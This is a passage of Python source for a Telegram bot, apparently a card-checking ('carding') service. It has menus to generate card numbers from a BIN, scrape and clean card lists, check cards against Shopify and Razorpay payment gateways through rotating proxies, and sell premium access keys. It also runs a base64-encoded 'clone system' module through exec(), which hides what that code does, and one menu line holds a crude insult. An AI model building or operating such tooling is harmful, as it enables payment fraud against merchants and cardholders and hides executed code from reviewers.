ZSkKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlWyJzdGF0dXMiXSA9ICJyZWplY3RlZCIKICAgICAgICAgICAgX2Nsel9zYXZlKGR0YSkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgZS5nZXQoImZpbGUiKSBhbmQgb3MucGF0aC5leGlzdHMoZVsiZmlsZSJdKToKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZVsiZmlsZSJdKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KHByZW1pdW1fZW1vamkoIlx1Mjc0YyA8Yj5cdTAyODBcdTFkMDdcdTAyOWNcdTFkMDdcdTFkMDRcdTFkMWJcdTFkMDdcdTFkMDU8L2I+IiksIHBhcnNlX21vZGU9Imh0bWwiKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiBhY3QgPT0gImNsemMiOgogICAgICAgICAgICBpZiBlLmdldCgic3RhdHVzIikgIT0gImFza2VkIjoKICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigiQWxyZWFkeSBwcm9jZXNzZWQiLCBhbGVydD1UcnVlKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIF9jbHpfa2lsbChlLmdldCgicGlkIikpCiAgICAgICAgICAgIGVbInN0YXR1cyJdID0gImFjdGl2ZSIKICAgICAgICAgICAgZVsicGlkIl0gPSBfY2x6X3NwYXduKGVbImZpbGUiXSkKICAgICAgICAgICAgZVsiZXhwaXJlX2F0Il0gPSBpbnQodGltZS50aW1lKCkpICsgQ0xaX0ZSRUVfSE9VUlMgKiAzNjAwCiAgICAgICAgICAgIGlmIGUuZ2V0KCJwbGFuIikgaW4gKCJwcmVtIiwgImdyYWNlIik6CiAgICAgICAgICAgICAgICBlWyJwbGFuIl0gPSAiZ3JhY2UiCiAgICAgICAgICAgIF9jbHpfc2F2ZShkdGEpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQocHJlbWl1bV9lbW9qaSgiXHUyNWI2XHVmZTBmIDxiPlx1MWQwNFx1MWQwZlx1MDI3NFx1MWQxYlx1MDI2YVx1MDI3NFx1MWQxY1x1MWQwN1x1MWQwNTwvYj4gXHUyMDE0IDI0aCBhdXIgY2hhbGdhLiIpLCBwYXJzZV9tb2RlPSJodG1sIikKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgYWN0ID09ICJjbHpkIjoKICAgICAgICAgICAgX2Nsel9raWxsKGUuZ2V0KCJwaWQiKSkKICAgICAgICAgICAgZVsic3RhdHVzIl0gPSAiZGVsZXRlZCIKICAgICAgICAgICAgX2Nsel9zYXZlKGR0YSkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChwcmVtaXVtX2Vtb2ppKCJcVTAwMDFGNUQxIDxiPlx1MWQwNVx1MWQwN1x1MDI5Zlx1MWQwN1x1MWQxYlx1MWQwN1x1MWQwNTwvYj4gXHUyMDE0IHVzZXIga2UgZGF0YSBzZSBib3QgcmVtb3ZlIGhvIGdheWEuIiksIHBhcnNlX21vZGU9Imh0bWwiKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICByZXR1cm4KICAgIGF3YWl0IGV2ZW50LmFuc3dlcigpCgojIC0tLS0tLS0tLS0gTU9OSVRPUiAtLS0tLS0tLS0tCgphc3luYyBkZWYgX2Nsel9hc2sodWlkLCBlLCByZWFzb24pOgogICAgdHJ5OgogICAgICAgIF9jbHpfa2lsbChlLmdldCgicGlkIikpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKICAgIGVbInBpZCJdID0gTm9uZQogICAgZVsic3RhdHVzIl0gPSAiYXNrZWQiCiAgICBlWyJhc2tlZF9hdCJdID0gaW50KHRpbWUudGltZSgpKQogICAgZ2lkID0gX2Nsel9jZmcoKS5nZXQoImdyb3VwIikKICAgIGlmIG5vdCBnaWQ6CiAgICAgICAgcmV0dXJuCiAgICB0eHQgPSBDTFpfVFhUX0VYUF9GUkVFIGlmIHJlYXNvbiA9PSAiZnJlZSIgZWxzZSBDTFpfVFhUX0VYUF9QUkVNCiAgICB0cnk6CiAgICAgICAgYXdhaXQgX2Nsel9zZigpKGdpZCwgZmlsZT1lWyJmaWxlIl0sIGNhcHRpb249cHJlbWl1bV9lbW9qaSh0eHQgJSAoaW50KHVpZCksIGludCh1aWQpKSksIHBhcnNlX21vZGU9Imh0bWwiLAogICAgICAgICAgICAgICAgICAgICAgICBmb3JjZV9kb2N1bWVudD1UcnVlLCByZXBseV90bz1lLmdldCgibXNnX2lkIiksCiAgICAgICAgICAgICAgICAgICAgICAgIGJ1dHRvbnM9W1sKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJ1dHRvbi5pbmxpbmUoIlx1MjViNlx1ZmUwZiBcdTFkMDRcdTFkMGZcdTAyNzRcdTFkMWJcdTAyNmFcdTAyNzRcdTFkMWNcdTFkMDciLCAoImNsemNfJXNfJXMiICUgKHVpZCwgZVsibiJdKSkuZW5jb2RlKCksIHN0eWxlPSJzdWNjZXNzIiwgaWNvbj1yYl9pY29uKCkpXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCdXR0b24uaW5saW5lKCJcVTAwMDFGNUQxIFx1MWQwNVx1MWQwN1x1MDI5Zlx1MWQwN1x1MWQxYlx1MWQwNyIsICgiY2x6ZF8lc18lcyIgJSAodWlkLCBlWyJuIl0pKS5lbmNvZGUoKSwgc3R5bGU9ImRhbmdlciIsIGljb249cmJfaWNvbigpKV1dKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleDoKICAgICAgICBwcmludCgiW0NMWl0gYXNrIHNlbmQgZmFpbDoiLCBleCkKCmFzeW5jIGRlZiBfY2x6X3RpY2soKToKICAgIGQgPSBfY2x6X2xvYWQoKQogICAgZGlydHkgPSBGYWxzZQogICAgbm93ID0gaW50KHRpbWUudGltZSgpKQogICAgZm9yIHVpZCBpbiBsaXN0KGQua2V5cygpKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGl1ID0gaW50KHVpZCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGZvciBlIGluIGRbdWlkXToKICAgICAgICAgICAgc3QgPSBlLmdldCgic3RhdHVzIikKICAgICAgICAgICAgaWYgc3QgIT0gImFjdGl2ZSI6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBpZiBub3QgX2Nsel9hbGl2ZShlLmdldCgicGlkIikpOgogICAgICAgICAgICAgICAgZVsicGlkIl0gPSBfY2x6X3NwYXduKGUuZ2V0KCJmaWxlIikpCiAgICAgICAgICAgICAgICBkaXJ0eSA9IFRydWUKICAgICAgICAgICAgaWYgZS5nZXQoInBsYW4iKSA9PSAiZnJlZSI6CiAgICAgICAgICAgICAgICBpZiBlLmdldCgiZXhwaXJlX2F0IikgYW5kIG5vdyA+IGVbImV4cGlyZV9hdCJdOgogICAgICAgICAgICAgICAgICAgIGF3YWl0IF9jbHpfYXNrKHVpZCwgZSwgImZyZWUiKQogICAgICAgICAgICAgICAgICAgIGRpcnR5ID0gVHJ1ZQogICAgICAgICAgICBlbGlmIGUuZ2V0KCJwbGFuIikgaW4gKCJwcmVtIiwgImdyYWNlIik6CiAgICAgICAgICAgICAgICBpZiBpc19wcmVtaXVtKGl1KToKICAgICAgICAgICAgICAgICAgICBpZiBlLmdldCgicGxhbiIpID09ICJncmFjZSI6CiAgICAgICAgICAgICAgICAgICAgICAgIGVbInBsYW4iXSA9ICJwcmVtIgogICAgICAgICAgICAgICAgICAgICAgICBkaXJ0eSA9IFRydWUKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgZS5nZXQoInBsYW4iKSA9PSAicHJlbSIgb3IgKGUuZ2V0KCJleHBpcmVfYXQiKSBhbmQgbm93ID4gZVsiZXhwaXJlX2F0Il0pOgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBfY2x6X2Fzayh1aWQsIGUsICJwcmVtIikKICAgICAgICAgICAgICAgICAgICAgICAgZGlydHkgPSBUcnVlCiAgICBpZiBkaXJ0eToKICAgICAgICBfY2x6X3NhdmUoZCkKCmFzeW5jIGRlZiBfY2x6X21vbml0b3IoKToKICAgIHByaW50KCJbQ0xaXSBtb25pdG9yIG9ubGluZSAoa2luZD0lcykiICUgX0NMWl9NQVJLRVIuZ2V0KCJraW5kIikpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGF3YWl0IGFzeW5jaW8uc2xlZXAoNjApCiAgICAgICAgdHJ5OgogICAgICAgICAgICBhd2FpdCBfY2x6X3RpY2soKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoIltDTFpdIHRpY2sgZXJyOiIsIGUpCgpkZWYgX2Nsel9zdGFydF9tb25pdG9yKCk6CiAgICB0cnk6CiAgICAgICAgX2wgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKCkKICAgICAgICBfbC5jcmVhdGVfdGFzayhfY2x6X21vbml0b3IoKSkKICAgICAgICBwcmludCgiW0NMWl0gbW9uaXRvciB0YXNrIGNyZWF0ZWQiKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCiAgICB0cnk6CiAgICAgICAgX2wgPSBnZXRhdHRyKGJvdCwgImxvb3AiLCBOb25lKSBvciBnZXRhdHRyKGJvdCwgIl9sb29wIiwgTm9uZSkKICAgICAgICBhc3luY2lvLnJ1bl9jb3JvdXRpbmVfdGhyZWFkc2FmZShfY2x6X21vbml0b3IoKSwgX2wpCiAgICAgICAgcHJpbnQoIltDTFpdIG1vbml0b3Igc2NoZWR1bGVkICh0aHJlYWRzYWZlKSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIltDTFpdIG1vbml0b3IgZmFpbDoiLCBlKQoKIyAtLS0tLS0tLS0tIC9jbG9uZWdyb3VwIC0tLS0tLS0tLS0KCkBib3Qub24oZXZlbnRzLk5ld01lc3NhZ2UocGF0dGVybj1yIl4vY2xvbmVncm91cCg/OkBcdyspPyQiKSkKYXN5bmMgZGVmIF9jbHpfY21kX2dyb3VwKGV2ZW50KToKICAgIGlmIG5vdCBpc19hZG1pbihldmVudC5zZW5kZXJfaWQpOgogICAgICAgIHJldHVybgogICAgaWYgbm90IChldmVudC5pc19ncm91cCBvciBldmVudC5pc19jaGFubmVsKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KHByZW1pdW1fZW1vamkoIlx1MjZhMFx1ZmUwZiBZZSBjb21tYW5kIDxiPmFwcHJvdmFsIGdyb3VwIGtlIGFuZGFyPC9iPiBiaGVqbyEiKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVybgogICAgYyA9IF9jbHpfY2ZnKCkKICAgIGNbImdyb3VwIl0gPSBldmVudC5jaGF0X2lkCiAgICBjWyJsaW5rIl0gPSBDTFpfQVBQUk9WQUxfTElOSwogICAgX2Nsel9jZmdfc2F2ZShjKQogICAgZmx1c2hlZCA9IDAKICAgIGQgPSBfY2x6X2xvYWQoKQogICAgZm9yIHVpZCBpbiBsaXN0KGQua2V5cygpKToKICAgICAgICBmb3IgZSBpbiBkW3VpZF06CiAgICAgICAgICAgIGlmIGUuZ2V0KCJzdGF0dXMiKSA9PSAicGVuZGluZ19ncm91cCI6CiAgICAgICAgICAgICAgICBvayA9IGF3YWl0IF9jbHpfc2VuZF9ncm91cChpbnQodWlkKSwgZSkKICAgICAgICAgICAgICAgIGlmIG9rOgogICAgICAgICAgICAgICAgICAgIGZsdXNoZWQgKz0gMQogICAgdHJ5OgogICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KHByZW1pdW1fZW1vamkoIlx1MjcwNSA8Yj5cdTFkMDBcdTFkMThcdTFkMThcdTAyODBcdTFkMGZcdTAyOGJcdTFkMDBcdTAyOWYgXHUwMjYyXHUwMjgwXHUxZDBmXHUxZDFjXHUxZDE4IHPhtIfhtJshPC9iPlxuXFUwMDAxRjRFNCBQZW5kaW5nIHJlcXVlc3RzOiAlZCBmbHVzaCBobyBnYXlpLiIgJSBmbHVzaGVkKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKCiMgLS0tLS0tLS0tLSBTVEFSVFVQIC0tLS0tLS0tLS0KCnRyeToKICAgIGlmIG5vdCBfY2x6X2NmZygpLmdldCgiZ3JvdXAiKSBhbmQgX0NMWl9NQVJLRVIuZ2V0KCJraW5kIikgPT0gIm1haW4iOgogICAgICAgIHByaW50KCJbQ0xaXSBcdTI2YTBcdWZlMGYgQXBwcm92YWwgZ3JvdXAgc2V0IG5haGkgaGUgXHUyMDE0IG93bmVyIGdyb3VwIG1lIC9jbG9uZWdyb3VwIGJoZWplOiAiICsgQ0xaX0FQUFJPVkFMX0xJTkspCmV4Y2VwdCBFeGNlcHRpb246CiAgICBwYXNzCl9jbHpfc3RhcnRfbW9uaXRvcigpCnByaW50KCJbQ0xaXSBjbG9uZSBzeXN0ZW0gb25saW5lIChraW5kPSVzLCBzZXNzPSVzKSIgJSAoX0NMWl9NQVJLRVIuZ2V0KCJraW5kIiksIF9DTFpfTUFSS0VSLmdldCgic2VzcyIpKSkK'
exec(_clz_b64x.b64decode(CLONE_MODULE_B64).decode('utf-8'), globals())
# ==== END CLONE SYSTEM (AUTO) ====





# ==================== END ADMIN PANEL ====================

# ==================== TOOLS MENU ====================

# ==================== SITE TOOLS ====================
# ==================== SHOPIFY TOOLS ====================
@bot.on(events.CallbackQuery(data=b"shopify_tools"))
async def shopify_tools_menu(event):
    await event.answer("🛒 sʜᴏᴘɪꜰʏ ᴛᴏᴏʟs!", alert=False)
    
    shopify_msg = f"""<b>🛒 sʜᴏᴘɪꜰʏ</b>
━━━━━━━━━━━━━━━━━━━━
<code>/site</code>
➜ ᴄʜᴇᴄᴋ ᴀʟʟ sʜᴏᴘɪꜰʏ sɪᴛᴇs
➜ ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ
➜ ɢᴇᴛ ᴛxᴛ ꜰɪʟᴇ ᴏꜰ ᴡᴏʀᴋɪɴɢ sɪᴛᴇs

<code>/addsites url</code>
➜ ᴛᴇsᴛ & ᴀᴅᴅ ɴᴇᴡ sʜᴏᴘɪꜰʏ sɪᴛᴇ
➜ ᴏɴʟʏ ᴡᴏʀᴋɪɴɢ sɪᴛᴇs ᴀᴅᴅᴇᴅ

<code>/rmsites url</code>
➜ ʀᴇᴍᴏᴠᴇ sᴘᴇᴄɪꜰɪᴄ sʜᴏᴘɪꜰʏ sɪᴛᴇ
━━━━━━━━━━━━━━━━━━━━
<b>💡 sʜᴏᴘɪꜰʏ ɢᴀᴛᴇᴡᴀʏ ᴋᴇ ʟɪʏᴇ sɪᴛᴇs!</b>"""

    await event.edit(
        premium_emoji(shopify_msg),
        buttons=[[Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary")]],
        parse_mode="html"
    )


# ==================== TOOLS MENU ====================
@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu(event):
    await event.answer("🔧 ᴛᴏᴏʟs ᴏᴘᴇɴᴇᴅ!", alert=False)
    
    tools_msg = f"""<b>ᴡᴇʟᴄᴏᴍᴇ ᴀʟᴏɴᴇ ᴄʜᴇᴄᴋᴇʀ</b> 
━━━━━━━━━━━━━━━━━━━━
<b>😆 sᴀʀᴀ ʀᴀᴀᴛ sᴏʏᴀ ɴɪ sᴜʙʜᴀɴ ᴍᴜᴢᴇ sᴏɴᴇ ᴅᴇ
💀 ᴛᴇʀᴇ ᴍᴀʏ ᴋᴏ ᴄʜᴏᴅᴏ... ʟᴏʟ 😆</b>

━━━━━━━━━━━━━━━━━━━━
<b>👑 ᴏᴡɴᴇʀ: ᴀʟᴏɴᴇ</b>"""

    tools_buttons = [
        [
            Button.inline("sʜᴏᴘɪꜰʏ", b"shopify_tools", style="primary"),
            Button.inline("ʀᴀᴢᴏʀᴘᴀʏ", b"rz_tools", style="primary"),
        ],
        [
            Button.inline("ᴘʀᴏxʏ", b"proxy_tools", style="primary"),
            Button.inline("ᴄᴄ ᴍᴇɴᴜ", b"cc_tools", style="primary"),
        ],
        [
            Button.inline("ᴘʟᴀɴ", b"premium_tools", style="success"),
        ],
        [
            Button.inline("ʙᴀᴄᴋ", b"back_to_start", style="primary"),
        ],
    ]

    await event.edit(
        premium_emoji(tools_msg),
        buttons=tools_buttons,
        parse_mode="html"
    )


# ==================== SHOPIFY TOOLS ====================
@bot.on(events.CallbackQuery(data=b"shopify_tools"))
async def shopify_tools_menu(event):
    await event.answer("🛒 sʜᴏᴘɪꜰʏ ᴛᴏᴏʟs!", alert=False)
    
    shopify_msg = f"""<b>🛒 sʜᴏᴘɪꜰʏ sɪᴛᴇs</b>
━━━━━━━━━━━━━━━━━━━━
<code>/site</code>
➜ ᴄʜᴇᴄᴋ ᴀʟʟ sʜᴏᴘɪꜰʏ sɪᴛᴇs
➜ ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ
➜ ɢᴇᴛ ᴛxᴛ ꜰɪʟᴇ ᴏꜰ ᴡᴏʀᴋɪɴɢ sɪᴛᴇs

<code>/addsites url</code>
➜ ᴛᴇsᴛ & ᴀᴅᴅ ɴᴇᴡ sʜᴏᴘɪꜰʏ sɪᴛᴇ
➜ ᴏɴʟʏ ᴡᴏʀᴋɪɴɢ sɪᴛᴇs ᴀᴅᴅᴇᴅ

<code>/rmsites url</code>
➜ ʀᴇᴍᴏᴠᴇ sᴘᴇᴄɪꜰɪᴄ sʜᴏᴘɪꜰʏ sɪᴛᴇ
━━━━━━━━━━━━━━━━━━━━
<b>💡 sʜᴏᴘɪꜰʏ ɢᴀᴛᴇᴡᴀʏ ᴋᴇ ʟɪʏᴇ sɪᴛᴇs!</b>"""

    await event.edit(
        premium_emoji(shopify_msg),
        buttons=[[Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary")]],
        parse_mode="html"
    )


# ==================== RAZORPAY TOOLS ====================
@bot.on(events.CallbackQuery(data=b"rz_tools"))
async def rz_tools_menu(event):
    await event.answer("💎 ʀᴀᴢᴏʀᴘᴀʏ ᴛᴏᴏʟs!", alert=False)
    
    rz_msg = f"""<b>💎 ʀᴀᴢᴏʀᴘᴀʏ sɪᴛᴇs</b>
━━━━━━━━━━━━━━━━━━━━
<code>/rzsites</code>
➜ ᴄʜᴇᴄᴋ ᴀʟʟ ʀᴢ sɪᴛᴇs ᴡɪᴛʜ ʀᴀᴢᴏʀᴘᴀʏ ᴀᴘɪ
➜ ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ
➜ ɢᴇᴛ ᴛxᴛ ꜰɪʟᴇ ᴏꜰ ᴡᴏʀᴋɪɴɢ ʀᴢ sɪᴛᴇs

<code>/addrzsites url</code>
➜ ᴛᴇsᴛ & ᴀᴅᴅ ɴᴇᴡ ʀᴀᴢᴏʀᴘᴀʏ sɪᴛᴇ
➜ ᴏɴʟʏ ᴡᴏʀᴋɪɴɢ sɪᴛᴇs ᴀᴅᴅᴇᴅ

<code>/rmrzsites url</code>
➜ ʀᴇᴍᴏᴠᴇ sᴘᴇᴄɪꜰɪᴄ ʀᴀᴢᴏʀᴘᴀʏ sɪᴛᴇ
━━━━━━━━━━━━━━━━━━━━
<b>💡 ʀᴀᴢᴏʀᴘᴀʏ ɢᴀᴛᴇᴡᴀʏ ᴋᴇ ʟɪʏᴇ sɪᴛᴇs!</b>"""

    await event.edit(
        premium_emoji(rz_msg),
        buttons=[[Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary")]],
        parse_mode="html"
    )


# ==================== PROXY TOOLS ====================
@bot.on(events.CallbackQuery(data=b"proxy_tools"))
async def proxy_tools_menu(event):
    await event.answer("📡 ᴘʀᴏxʏ ᴛᴏᴏʟs!", alert=False)
    
    proxy_msg = f"""<b>📡 ᴘʀᴏxʏ</b>
━━━━━━━━━━━━━━━━━━━━
<code>/proxy</code>
➜ ᴄʜᴇᴄᴋ ᴀʟʟ ᴘʀᴏxɪᴇs ꜰʀᴏᴍ ᴘʀᴏxʏ.ᴛxᴛ
➜ ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ
➜ ɢᴇᴛ ᴛxᴛ ꜰɪʟᴇ ᴏꜰ ᴡᴏʀᴋɪɴɢ ᴘʀᴏxɪᴇs

<code>/addproxy</code>
➜ ᴀᴅᴅ ɴᴇᴡ ᴘʀᴏxɪᴇs (ᴛᴇsᴛ ꜰɪʀsᴛ)
➜ sᴜᴘᴘᴏʀᴛs: ɪᴘ:ᴘᴏʀᴛ, sᴏᴄᴋs5, ʜᴛᴛᴘ
➜ ᴏɴʟʏ ᴡᴏʀᴋɪɴɢ ᴘʀᴏxɪᴇs ᴀᴅᴅᴇᴅ

<code>/getproxy</code>
➜ ᴠɪᴇᴡ ᴀʟʟ sᴀᴠᴇᴅ ᴘʀᴏxɪᴇs
➜ ɢᴇᴛ ᴛxᴛ ꜰɪʟᴇ ɪꜰ › 50 ᴘʀᴏxɪᴇs

<code>/rmproxy ip:port</code>
➜ ʀᴇᴍᴏᴠᴇ sᴘᴇᴄɪꜰɪᴄ ᴘʀᴏxʏ

<code>/clearproxy</code>
➜ ᴄʟᴇᴀʀ ᴀʟʟ + ᴀᴜᴛᴏ ʙᴀᴄᴋᴜᴘ ᴛxᴛ
━━━━━━━━━━━━━━━━━━━━
<b>💡 ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs ᴀᴜᴛᴏ-ʀᴇᴍᴏᴠᴇᴅ!</b>"""

    await event.edit(
        premium_emoji(proxy_msg),
        buttons=[[Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary")]],
        parse_mode="html"
    )


# ==================== CC TOOLS ====================
@bot.on(events.CallbackQuery(data=b"cc_tools"))
async def cc_tools_menu(event):
    await event.answer("💳 ᴄᴄ ᴛᴏᴏʟs!", alert=False)
    
    cc_msg = f"""<b>💳 ᴄᴄ ᴛᴏᴏʟs</b>
━━━━━━━━━━━━━━━━━━━━
<code>/gen BIN COUNT</code>
➜ ɢᴇɴᴇʀᴀᴛᴇ ᴄᴄ ꜰʀᴏᴍ ʙɪɴ
➜ ꜰᴏʀᴍᴀᴛ: /gen 601100 10000
➜ ᴍᴀx: 100,000 ᴄᴀʀᴅs

<code>/scrape</code>
➜ ʀᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ᴄᴄ ꜰɪʟᴇ
➜ ʀᴇᴍᴏᴠᴇs ᴅᴜᴘʟɪᴄᴀᴛᴇs
➜ ʀᴇᴍᴏᴠᴇs ᴇxᴘɪʀᴇᴅ ᴄᴀʀᴅs
➜ ɢᴇᴛ ᴄʟᴇᴀɴ ᴛxᴛ ꜰɪʟᴇ
━━━━━━━━━━━━━━━━━━━━
<b>💡 ɢᴇɴᴇʀᴀᴛᴇᴅ ᴄᴄ ꜰᴏʀ ᴛᴇsᴛɪɴɢ ᴏɴʟʏ!</b>"""

    await event.edit(
        premium_emoji(cc_msg),
        buttons=[[Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary")]],
        parse_mode="html"
    )

@bot.on(events.NewMessage(pattern='/plan'))
async def plan_cmd(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
        first_name = sender.first_name if sender.first_name else "ᴜɴᴋɴᴏᴡɴ"
    except:
        username = "ᴜɴᴋɴᴏᴡɴ"
        first_name = "ᴜɴᴋɴᴏᴡɴ ᴜsᴇʀ"

    is_prem = is_premium(user_id)
    is_adm = is_admin(user_id)
    
    # ✅ Device info variables
    device_info = ""
    key_info = ""
    
    if is_adm:
        premium_status = "👑 ᴀᴅᴍɪɴ - ꜰᴜʟʟ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴄᴄᴇss"
        expiry = "∞ ʟɪꜰᴇᴛɪᴍᴇ ᴀᴅᴍɪɴ"
        status_emoji = "👑"
        daily_used = "∞"
        daily_limit = "∞"
        plan_type = "👑 ᴀᴅᴍɪɴ ᴘʟᴀɴ"
        
    elif is_prem:
        premium_status = "💎 ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ"
        expiry = "ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴇ"
        status_emoji = "💎"
        daily_used = "∞"
        daily_limit = "∞"
        plan_type = "💎 ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴ"
        
        # ✅ Get expiry from premium.txt
        try:
            with open(PREMIUM_FILE, "r", encoding='utf-8') as f:
                for line in f:
                    if str(user_id) in line:
                        parts = line.strip().split("|")
                        if len(parts) >= 2:
                            expiry = parts[1].strip()
                        break
        except Exception as e:
            print(f"Premium file error: {e}")
        
        # ✅ Check multi-device key usage
        try:
            keys = load_keys()
            for key, data in keys.items():
                users_list = data.get("users", [])
                if str(user_id) in users_list:
                    device_limit = data.get("device_limit", 0)
                    devices_used = data.get("used", 0)
                    device_info = f"\n📱 <b>ᴅᴇᴠɪᴄᴇ:</b> {devices_used}/{device_limit} ᴜsᴇᴅ"
                    key_info = f"\n🔑 <b>ᴋᴇʏ:</b> <code>{key[:20]}...</code>"
                    break
        except Exception as e:
            print(f"Key check error: {e}")
            
    else:
        premium_status = "✅ ꜰʀᴇᴇ ᴜsᴇʀ"
        expiry = "ɴ/ᴀ"
        status_emoji = "✅"
        plan_type = "⭐ ꜰʀᴇᴇ ᴘʟᴀɴ"
        
        # ✅ Get daily usage for free users
        try:
            usage = get_daily_usage(user_id)
            used = usage.get("cc_count", 0)
        except:
            used = 0
        daily_used = f"{used}"
        daily_limit = "150"

    msg = f"""⚡💳 <b>ᴀᴜᴛᴏ sʜᴏᴘɪꜰʏ ᴄʜᴇᴄᴋᴇʀ</b> 💳⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━

{status_emoji} <b>ᴜsᴇʀ ᴘʀᴏꜰɪʟᴇ</b>
🆔 <b>ɪᴅ:</b> <code>{user_id}</code>
👤 <b>ɴᴀᴍᴇ:</b> {first_name}
🔖 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{username}

💎 <b>ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs</b>
🏷️ <b>ᴘʟᴀɴ:</b> {plan_type}
{premium_status}
⏳ <b>ᴇxᴘɪʀʏ:</b> <code>{expiry}</code>{device_info}{key_info}

📊 <b>ᴛᴏᴅᴀʏ's ᴜsᴀɢᴇ</b>
🔥 <b>ᴜsᴇᴅ:</b> <code>{daily_used}</code> / <code>{daily_limit}</code> ᴄᴄ
• sɪɴɢʟᴇ ᴄʜᴇᴄᴋ (/ᴄᴄ) → {daily_limit} ʟɪᴍɪᴛ
• ʙᴜʟᴋ ᴄʜᴇᴄᴋ (/ᴄʜᴋ) → ꜰʀᴇᴇ: 3000 | ᴘʀᴇᴍɪᴜᴍ: ∞

🔑 <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b>
ᴜsᴇ <code>/redeem KEY_HERE</code> ꜰᴏʀ ɪɴsᴛᴀɴᴛ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ

🔄 <b>ɢᴇᴛ ᴘʀᴇᴍɪᴜᴍ</b>
ᴄᴏɴᴛᴀᴄᴛ Admin ꜰᴏʀ ᴋᴇʏs

━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 <b>ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀʟᴏɴᴇ</b>"""

    await event.reply(premium_emoji(msg), parse_mode='html')



# ==================== PREMIUM TOOLS ====================
@bot.on(events.CallbackQuery(data=b"premium_tools"))
async def premium_tools_menu(event):
    await event.answer("🔑 ᴘʀᴇᴍɪᴜᴍ ᴛᴏᴏʟs!", alert=False)
    
    premium_msg = f"""<b>🔑 ᴘʟᴀɴ ɪɴꜰᴏ</b>
━━━━━━━━━━━━━━━━━━━━
<code>/redeem KEY</code>
➜ ᴀᴄᴛɪᴠᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss
➜ ɢᴇᴛ ᴋᴇʏ ꜰʀᴏᴍ Admin

<code>/plan</code>
➜ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ ᴘʟᴀɴ
➜ ᴠɪᴇᴡ ᴇxᴘɪʀʏ & ᴜsᴀɢᴇ

